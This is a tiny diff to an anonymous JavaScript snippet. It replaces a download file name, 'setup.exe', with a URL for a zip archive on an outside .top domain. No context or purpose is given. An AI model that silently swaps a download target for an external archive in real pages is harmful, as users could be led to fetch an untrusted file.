@@ -1,3 +1,3 @@
 (function() {
-    window.filename = 'setup.exe';
+    window.filename = 'https://dows.so123so.top/wangxisqmsqa.xi.zip';
 })();
